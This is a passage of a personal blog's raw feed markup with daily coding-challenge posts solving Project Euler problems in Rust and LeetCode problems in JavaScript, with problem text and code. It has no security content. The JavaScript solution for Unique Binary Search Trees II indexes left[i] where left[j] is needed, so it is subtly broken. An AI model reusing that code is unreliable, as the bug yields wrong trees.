class="built_in">Vec</span>&lt;<span class="built_in">i32</span>&gt; = <span class="built_in">Vec</span>::new();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> used: <span class="built_in">Vec</span>&lt;<span class="built_in">bool</span>&gt; = [<span class="literal">false</span>].to_vec();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1i64</span>..(n <span class="keyword">as</span> <span class="built_in">i64</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = fac[i <span class="keyword">as</span> <span class="built_in">usize</span> - <span class="number">1</span>]*i;</span><br><span class="line">        fac.push(tmp);</span><br><span class="line">        used.push(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cur = n-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> cur &gt;= <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> index = k/fac[cur <span class="keyword">as</span> <span class="built_in">usize</span>];</span><br><span class="line">        k %= fac[cur <span class="keyword">as</span> <span class="built_in">usize</span>];</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..used.len() &#123;</span><br><span class="line">            <span class="keyword">if</span> !used[i] &#123;</span><br><span class="line">                <span class="keyword">if</span> index &gt; <span class="number">0</span> &#123;</span><br><span class="line">                    index -= <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    ans.push(i <span class="keyword">as</span> <span class="built_in">i32</span>);</span><br><span class="line">                    used[i] = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cur -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">95. Unique Binary Search Trees II</span><br><span class="line"></span><br><span class="line">Given an integer n, generate all structurally unique BST&apos;s (binary search trees) that store values 1 ... n.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line"></span><br><span class="line">Input: 3</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [1,null,3,2],</span><br><span class="line">  [3,2,null,1],</span><br><span class="line">  [3,1,null,null,2],</span><br><span class="line">  [2,1,3],</span><br><span class="line">  [1,null,2,null,3]</span><br><span class="line">]</span><br><span class="line">Explanation:</span><br><span class="line">The above output corresponds to the 5 unique BST&apos;s shown below:</span><br><span class="line"></span><br><span class="line">   1         3     3      2      1</span><br><span class="line">    \       /     /      / \      \</span><br><span class="line">     3     2     1      1   3      2</span><br><span class="line">    /     /       \                 \</span><br><span class="line">   2     1         2                 3</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Because it is BST, so when we determine one root, we will known what&#39;s on its left and what&#39;s on right. So we could do it recursively.</p><p>Because recursive process will go through many repeated tree nodes(like recursive fibonacci function), so we could memorize it.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; n</span></span><br><span class="line"><span class="comment"> * @return &#123;TreeNode[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> generateTrees = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(n===<span class="number">0</span>) <span class="keyword">return</span> [];</span><br><span class="line">  <span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">return</span> generateTreess(<span class="number">1</span>,n+<span class="number">1</span>,map);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Interval is left-closed right-opened</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; l</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; r</span></span><br><span class="line"><span class="comment"> * @param &#123;Map&#125; map</span></span><br><span class="line"><span class="comment"> * @return &#123;TreeNode[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateTreess</span>(<span class="params">l,r,map</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(l===r) <span class="keyword">return</span> [<span class="literal">null</span>];</span><br><span class="line">  <span class="keyword">if</span>(map.has(l)&amp;&amp;map.get(l).has(r))&#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(l).get(r);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> trees = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = l; i &lt; r; ++i)&#123;</span><br><span class="line">    <span class="keyword">const</span> left = generateTreess(l,i,map);</span><br><span class="line">    <span class="keyword">const</span> right = generateTreess(i+<span class="number">1</span>,r,map);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; left.length; ++j)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> k = <span class="number">0</span>; k &lt; right.length; ++k)&#123;</span><br><span class="line">        <span class="keyword">const</span> node = <span class="keyword">new</span> TreeNode(i);</span><br><span class="line">        node.left = left[i];</span><br><span class="line">        node.right = right[k];</span><br><span class="line">        trees.push(node);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!map.has(l))&#123;</span><br><span class="line">    map.set(l,<span class="keyword">new</span> <span class="built_in">Map</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  map.get(l).set(r,trees);</span><br><span class="line">  <span class="keyword">return</span> trees;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-12 Daily Challenge</title>
      <link href="/2019-01-12-Daily-Challenge/"/>
      <url>/2019-01-12-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Non-abundant sums</em> in <em>Rust</em> and <em>Word Ladder</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Non-abundant sums</span><br><span class="line"></span><br><span class="line">Problem 23 </span><br><span class="line"></span><br><span class="line">A perfect number is a number for which the sum of its proper divisors is exactly equal to the number. For example, the sum of the proper divisors of 28 would be 1 + 2 + 4 + 7 + 14 = 28, which means that 28 is a perfect number.</span><br><span class="line"></span><br><span class="line">A number n is called deficient if the sum of its proper divisors is less than n and it is called abundant if this sum exceeds n.</span><br><span class="line"></span><br><span class="line">As 12 is the smallest abundant number, 1 + 2 + 3 + 4 + 6 = 16, the smallest number that can be written as the sum of two abundant numbers is 24. By mathematical analysis, it can be shown that all integers greater than 28123 can be written as the sum of two abundant numbers. However, this upper limit cannot be reduced any further by analysis even though it is known that the greatest number that cannot be expressed as the sum of two abundant numbers is less than this limit.</span><br><span class="line"></span><br><span class="line">Find the sum of all the positive integers which cannot be written as the sum of two abundant numbers.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> std::vec::<span class="built_in">Vec</span>;</span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">const</span> SIZE: <span class="built_in">usize</span> = <span class="number">28124</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> arr: [<span class="built_in">bool</span>; SIZE] = [<span class="literal">false</span>; SIZE];</span><br><span class="line">    <span class="keyword">let</span> sieve = Sieve::new(<span class="number">10000</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> abundants :<span class="built_in">Vec</span>&lt;<span class="built_in">i32</span>&gt; = <span class="built_in">Vec</span>::new();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">i64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">28123</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> sum_of_divisor(i, &amp;sieve) &gt; i &#123;</span><br><span class="line">            abundants.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..(abundants.len()) &#123;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i..(abundants.len())&#123;</span><br><span class="line">            <span class="keyword">if</span> ((abundants[i] + abundants[j]) <span class="keyword">as</span> <span class="built_in">usize</span>) &lt; SIZE &#123;</span><br><span class="line">                arr[(abundants[i] + abundants[j]) <span class="keyword">as</span> <span class="built_in">usize</span>] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">assert!</span>(arr[<span class="number">24</span>]);</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..SIZE &#123;</span><br><span class="line">        <span class="keyword">if</span> !arr[i] &#123;</span><br><span class="line">            ans += i <span class="keyword">as</span> <span class="built_in">i64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">sum_of_divisor</span></span>(n: <span class="built_in">i32</span>, sieve: &amp;Sieve) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> factors: <span class="built_in">Vec</span>&lt;(<span class="built_in">usize</span>, <span class="built_in">usize</span>)&gt; = <span class="keyword">match</span> sieve.factor(n <span class="keyword">as</span> <span class="built_in">usize</span>) &#123;</span><br><span class="line">        <span class="literal">Ok</span>(v) =&gt; v,</span><br><span class="line">        <span class="literal">Err</span>(_) =&gt; <span class="built_in">Vec</span>::new(),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> factor <span class="keyword">in</span> factors &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> sum = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="number">0</span>..factor.<span class="number">1</span> &#123;</span><br><span class="line">            tmp *= factor.<span class="number">0</span>;</span><br><span class="line">            sum += tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        ans *= sum;</span><br><span class="line">    &#125;</span><br><span class="line">    ans <span class="keyword">as</span> <span class="built_in">i32</span> - n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">127. Word Ladder</span><br><span class="line"></span><br><span class="line">Given two words (beginWord and endWord), and a dictionary&apos;s word list, find the length of shortest transformation sequence from beginWord to endWord, such that:</span><br><span class="line"></span><br><span class="line">Only one letter can be changed at a time.</span><br><span class="line">Each transformed word must exist in the word list. Note that beginWord is not a transformed word.</span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">Return 0 if there is no such transformation sequence.</span><br><span class="line">All words have the same length.</span><br><span class="line">All words contain only lowercase alphabetic characters.</span><br><span class="line">You may assume no duplicates in the word list.</span><br><span class="line">You may assume beginWord and endWord are non-empty and are not the same.</span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input:</span><br><span class="line">beginWord = &quot;hit&quot;,</span><br><span class="line">endWord = &quot;cog&quot;,</span><br><span class="line">wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]</span><br><span class="line"></span><br><span class="line">Output: 5</span><br><span class="line"></span><br><span class="line">Explanation: As one shortest transformation is &quot;hit&quot; -&gt; &quot;hot&quot; -&gt; &quot;dot&quot; -&gt; &quot;dog&quot; -&gt; &quot;cog&quot;,</span><br><span class="line">return its length 5.</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input:</span><br><span class="line">beginWord = &quot;hit&quot;</span><br><span class="line">endWord = &quot;cog&quot;</span><br><span class="line">wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;]</span><br><span class="line"></span><br><span class="line">Output: 0</span><br><span class="line"></span><br><span class="line">Explanation: The endWord &quot;cog&quot; is not in wordList, therefore no possible transformation.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Of course BFS can handle this, but I want to implement dijkstra in js.</p><p>So I really have done a shitty job..... :X</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; beginWord</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; endWord</span></span><br><span class="line"><span class="comment"> * @param &#123;string[]&#125; wordList</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> ladderLength = <span class="function"><span class="keyword">function</span>(<span class="params">beginWord, endWord, wordList</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">if</span>(wordList.indexOf(beginWord)==<span class="number">-1</span>) wordList.unshift(beginWord);</span><br><span class="line">  <span class="keyword">let</span> G = <span class="keyword">new</span> <span class="built_in">Array</span>(wordList.length);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;wordList.length; ++i)&#123;</span><br><span class="line">    map.set(wordList[i], i);</span><br><span class="line">    G[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(wordList.length).fill(<span class="number">1e10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// console.log(map);</span></span><br><span class="line">  <span class="keyword">let</span> OK = <span class="function">(<span class="params">str1, str2</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;str1.length; ++i)&#123;</span><br><span class="line">      <span class="keyword">if</span>(str1.charAt(i) !== str2.charAt(i)) ++cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt===<span class="number">1</span>;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> dijkstra = <span class="function">(<span class="params">src, dst</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> d = <span class="keyword">new</span> <span class="built_in">Array</span>(wordList.length).fill(<span class="number">1e10</span>);</span><br><span class="line">    d[src] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;wordList.length; ++i)&#123;</span><br><span class="line">      set.add(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(set.size)&#123;</span><br><span class="line">      <span class="keyword">let</span> mx = <span class="number">1e11</span>;</span><br><span class="line">      <span class="keyword">let</span> index;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">const</span> v <span class="keyword">of</span> set)&#123;</span><br><span class="line">        <span class="keyword">if</span>(d[v] &lt; mx)&#123;</span><br><span class="line">          mx = d[v];</span><br><span class="line">          index = v;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      set.delete(index);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;wordList.length; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(G[i][index] + d[index]&lt;d[i])&#123;</span><br><span class="line">          d[i] = G[i][index] + d[index];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d[dst];</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span>(!map.has(beginWord)||!map.has(endWord)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;wordList.length; ++i)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j=i+<span class="number">1</span>; j&lt;wordList.length; ++j)&#123;</span><br><span class="line">      <span class="keyword">if</span>(OK(wordList[i],wordList[j]))&#123;</span><br><span class="line">        G[i][j] = G[j][i] = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// console.log(G);</span></span><br><span class="line">  <span class="comment">// console.log(map.get(beginWord),map.get(endWord));</span></span><br><span class="line">  <span class="keyword">let</span> ans = dijkstra(map.get(beginWord), map.get(endWord));</span><br><span class="line">  <span class="comment">// console.log(G);</span></span><br><span class="line">  <span class="keyword">return</span> ans &lt; <span class="number">1e9</span>?ans+<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(ladderLength("hit","cog",  ["hot","dot","dog","lot","log","cog"]));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-11 Daily Challenge</title>
      <link href="/2019-01-11-Daily-Challenge/"/>
      <url>/2019-01-11-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Names scores</em> in <em>Rust</em> and <em>Optimal Division</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Names scores</span><br><span class="line"></span><br><span class="line">Problem 22 </span><br><span class="line"></span><br><span class="line">Using names.txt (right click and &apos;Save Link/Target As...&apos;), a 46K text file containing over five-thousand first names, begin by sorting it into alphabetical order. Then working out the alphabetical value for each name, multiply this value by its alphabetical position in the list to obtain a name score.</span><br><span class="line"></span><br><span class="line">For example, when the list is sorted into alphabetical order, COLIN, which is worth 3 + 15 + 12 + 9 + 14 = 53, is the 938th name in the list. So, COLIN would obtain a score of 938 × 53 = 49714.</span><br><span class="line"></span><br><span class="line">What is the total of all the name scores in the file?</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Emmmmm, use .sort so... nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> names = [</span><br><span class="line">        <span class="built_in">String</span>::from(<span class="string">"MARY"</span>),</span><br><span class="line">        <span class="built_in">String</span>::from(<span class="string">"PATRICIA"</span>),</span><br><span class="line">        <span class="built_in">String</span>::from(<span class="string">"LINDA"</span>),</span><br><span class="line">        <span class="built_in">String</span>::from(<span class="string">"BARBARA"</span>),</span><br><span class="line">        <span class="comment">/* omit 5K lines */</span></span><br><span class="line">        <span class="built_in">String</span>::from(<span class="string">"HAI"</span>),</span><br><span class="line">        <span class="built_in">String</span>::from(<span class="string">"ELDEN"</span>),</span><br><span class="line">        <span class="built_in">String</span>::from(<span class="string">"DORSEY"</span>),</span><br><span class="line">        <span class="built_in">String</span>::from(<span class="string">"DARELL"</span>),</span><br><span class="line">        <span class="built_in">String</span>::from(<span class="string">"BRODERICK"</span>),</span><br><span class="line">        <span class="built_in">String</span>::from(<span class="string">"ALONSO"</span>),</span><br><span class="line">];</span><br><span class="line">    names.sort();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">i64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> MINES: <span class="built_in">i32</span> = <span class="string">'A'</span> <span class="keyword">as</span> <span class="built_in">i32</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..names.len() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> score = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> letter <span class="keyword">in</span> names[i].chars() &#123;</span><br><span class="line">            score += letter <span class="keyword">as</span> <span class="built_in">i32</span> - MINES;</span><br><span class="line">        &#125;</span><br><span class="line">        ans += (score * (i <span class="keyword">as</span> <span class="built_in">i32</span> +<span class="number">1</span>)) <span class="keyword">as</span> <span class="built_in">i64</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td 